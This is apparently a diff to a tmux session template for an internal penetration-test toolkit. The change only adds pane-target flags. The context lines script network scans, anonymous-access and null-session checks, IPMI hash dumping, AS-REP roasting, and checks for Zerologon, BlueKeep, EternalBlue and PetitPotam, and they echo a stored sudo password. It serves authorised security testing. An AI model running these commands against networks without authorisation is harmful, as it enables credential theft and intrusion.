@@ -22,49 +22,49 @@ windows:
   - scanning: 
       panes:
         - masscan:
-          - tmux select-pane -T 'masscan'
+          - tmux select-pane -T 'masscan' -t "unauthd:scanning.0"
           - cd <%= @settings["rootDir"] %>/scans/Lists
         - nmap top5000 tcp:
-          - tmux select-pane -T 'nmap top5000 tcp'
+          - tmux select-pane -T 'nmap top5000 tcp' -t "unauthd:scanning.1"
           - echo <%= @settings["nomadPass"] %> | sudo -S su
           - <%= @settings["prefill"] %> "sudo nmap -sC -sV -T4 -sS -vvv --top-ports 5000 -iL <%= @settings["rootDir"] %>/ipList.txt -oA <%= @settings["rootDir"] %>/scans/top5000-tcp"; clear
         - nmap top500 udp:
-          - tmux select-pane -T 'nmap top500 udp'
+          - tmux select-pane -T 'nmap top500 udp' -t "unauthd:scanning.2"
           - echo <%= @settings["nomadPass"] %> | sudo -S su
           - <%= @settings["prefill"] %> "sudo nmap -sC sV -T4 -sU -vvv --top-ports 500 -iL <%= @settings["rootDir"] %>/ipList.txt -oA <%= @settings["rootDir"] %>/scans/top500-udp"; clear
         - nmap all tcp ports after 4000:
-          - tmux select-pane -T 'nmap all tcp ports after 4000'
+          - tmux select-pane -T 'nmap all tcp ports after 4000' -t "unauthd:scanning.3"
           - nmap -oG - -v --top-ports 4000 | awk -F'[);]' '/Ports/{print $2}' > <%= @settings["rootDir"] %>/top-4000-ports.txt
           - echo <%= @settings["nomadPass"] %> | sudo -S su
           - <%= @settings["prefill"] %> "sudo nmap -sC -sV -T4 -O -sS -vvv -p- -iL <%= @settings["rootDir"] %>/ipList.txt  --exclude-ports $(cat <%= @settings["rootDir"] %>/top-4000-ports.txt) -oA <%= @settings["rootDir"] %>/scans/all-tcp-after-4000"; clear
   - services: 
       panes:
         - dns:
-          - tmux select-pane -T 'dnsrecon'
+          - tmux select-pane -T 'dnsrecon' -t "unauthd:services.0"
           - dnsrecon -d <%= @settings["domain"] %> -t axfr
         - ftp:
-          - tmux select-pane -T 'ftp'
+          - tmux select-pane -T 'ftp' -t "unauthd:services.1"
           - cat <%= @settings["rootDir"] %>/scans/Lists/p21.lst && msfconsole -q -x "workspace -a <%= @settings["workspace"] %>; use auxiliary/scanner/ftp/anonymous; set rhosts file:<%= @settings["rootDir"] %>/scans/Lists/p21.lst; run"
         - snmp:
-          - tmux select-pane -T 'snmp'
+          - tmux select-pane -T 'snmp' -t "unauthd:services.2"
           - cat <%= @settings["rootDir"] %>/scans/Lists/snmp.lst && msfconsole -q -x "workspace -a <%= @settings["workspace"] %>; use auxiliary/scanner/snmp/snmp_login; set rhosts file:<%= @settings["rootDir"] %>/scans/Lists/snmp.lst; run"
         - IPMI Cipher Zero:
-          - tmux select-pane -T 'IPMI Cipher Zero'
+          - tmux select-pane -T 'IPMI Cipher Zero' -t "unauthd:services.3"
           - cat <%= @settings["rootDir"] %>/scans/Lists/p623.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS file://<%= @settings["rootDir"] %>/scans/Lists/p623.lst; spool <%= @settings["rootDir"] %>/scans/ipmi_version.txt>; run; spool off; exit'
           - cat <%= @settings["rootDir"] %>/scans/Lists/p623.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS file://<%= @settings["rootDir"] %>/scans/ipmi_dumphashes.txt>; run; spool off; exit'
           - cat <%= @settings["rootDir"] %>/scans/Lists/p623.lst && msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS file://<%= @settings["rootDir"] %>/scans/ipmi_cipher_zero.txt>; run; spool off; exit'
           - wc -l <%= @settings["rootDir"] %>/scans/ipmi*
         - printers:
-          - tmux select-pane -T 'printers'
+          - tmux select-pane -T 'printers' -t "unauthd:services.4"
           - msfconsole -q -x "workspace -a <%= @settings['workspace'] %>; services -u -S 'print jet lasetjet'"
   - SMB/nullSesh: 
       panes:
         - cme:
-          - tmux select-pane -T 'cme'
+          - tmux select-pane -T 'cme' -t "unauthd:SMB/nullSesh.0"
           - mkdir <%= @settings["rootDir"] %>/scans/smb; cd <%= @settings["rootDir"] %>/scans/smb
           - cat <%= @settings["rootDir"] %>/scans/Lists/smb.lst && crackmapexec smb <%= @settings["rootDir"] %>/scans/Lists/smb.lst -u '' -p '' | tee ./cme.txt &&  cat cme.txt | grep -ia 'signing:false' | awk '{print $2}' | tee ./smb_signing_not_required.txt && cat cme.txt | grep -ia 'smbv1:true' | awk '{print $2}' | tee ./smbv1_enabled.txt && cat cme.txt | grep -ia 'Windows' | grep -av -E 'Windows 8|Windows 1|Build 9600|Server 201|Server 202' | awk '{print $2 " - " $6 " " $7 " " $8 " " $9}' | tee ./unsupported.txt && cat cme.txt | grep -a '+' | tee ./smb_null_logon.txt && clear && for i in smb_null_logon.txt smb_signing_not_required.txt smbv1_enabled.txt unsupported.txt; do echo $i; cat $i; done && wc -l *
         - enum4linux:
-          - tmux select-pane -T 'enum4linux'
+          - tmux select-pane -T 'enum4linux' -t "unauthd:SMB/nullSesh.1"
           - echo "DC null sessions check:"
           - for i in $(cat <%= @settings["rootDir"] %>/dcIP.txt); do enum4linux $i; done | tee enum4linux-DC.txt
           - echo "SMB check:"
@@ -72,28 +72,28 @@ windows:
   - ASREProast: 
       panes:
         - ASREP roast:
-          - tmux select-pane -T 'ASREP roast'
+          - tmux select-pane -T 'ASREP roast' -t "unauthd:ASREProast.0"
           - <%= @settings["prefill"] %> 'GetNPUsers.py <%= @settings["domain"] %>/ -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -no-pass -usersfile <%= @settings["rootDir"] %>/usernames.txt -outputfile <%= @settings["rootDir"] %>/scans/unauthd-asrepRoast.txt -format john'; clear
   - coercAuth: 
       panes:
         - coercAuth:
-          - tmux select-pane -T 'coercAuth'
+          - tmux select-pane -T 'coercAuth' -t "unauthd:coercAuth.0"
           - cat <%= @settings["rootDir"] %>/scans/Lists/smb.lst && msfconsole -q -x "workspace -a <%= @settings["workspace"] %>; use scanner/dcerpc/petitpotam; set rhosts file:<%= @settings["rootDir"] %>/scans/Lists/smb.lst; run"
   - bigName: 
       panes:
         - zerologon:
-          - tmux select-pane -T 'zerologon'
+          - tmux select-pane -T 'zerologon' -t "unauthd:bigName.0"
           - <%= @settings["prefill"] %> 'zerologon_tester.py $DC-netbiosName $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1)'; clear; echo -e "\e[0;31mIF VULNERABLE INFORM CLIENT & TECH LEAD\033[0m"
         - blueKeep:
-          - tmux select-pane -T 'eternalBlue'
+          - tmux select-pane -T 'eternalBlue' -t "unauthd:bigName.1"
           - cat <%= @settings["rootDir"] %>/scans/Lists/kerberos.lst && msfconsole -q -x "workspace -a <%= @settings["workspace"] %>; use scanner/rdp/cve_2019_0708_bluekeep; set rhosts file:<%= @settings["rootDir"] %>/scans/Lists/kerberos.lst; run; exit"; echo -e "\e[0;31mIF VULNERABLE INFORM CLIENT & TECH LEAD\033[0m"
         - eternalBlue:
-          - tmux select-pane -T 'eternalBlue'
+          - tmux select-pane -T 'eternalBlue' -t "unauthd:bigName.2"
           - cat <%= @settings["rootDir"] %>/scans/Lists/smb.lst && msfconsole -q -x "workspace -a <%= @settings["workspace"] %>; use scanner/smb/smb_ms17_010; set rhosts file:<%= @settings["rootDir"] %>/scans/Lists/smb.lst; run; exit"; echo -e "\e[0;31mAVOID RUNNING ON CRITICAL SYSTEMS\033[0m"
   - ldapSigning: 
       panes:
         - ldapSigning:
-          - tmux select-pane -T 'ldapSigning'
+          - tmux select-pane -T 'ldapSigning' -t "unauthd:ldapSigning.0"
           - cd /opt/nomad-tools 
           - git clone https://github.com/zyn3rgy/LdapRelayScan.git 
           - cd LdapRelayScan && pipenv install && mkdir -p <%= @settings["rootDir"] %>/ldap; clear
@@ -101,7 +101,7 @@ windows:
   - timeroast: 
       panes:
         - timeroast:
-          - tmux select-pane -T 'timeroast'
+          - tmux select-pane -T 'timeroast' -t "unauthd:timeroast.0"
           - cd /opt/nomad-tools 
           - git clone https://github.com/SecuraBV/Timeroast.git 
           - cd /opt/nomad-tools/Timeroast && mkdir -p <%= @settings["rootDir"] %>/ldap
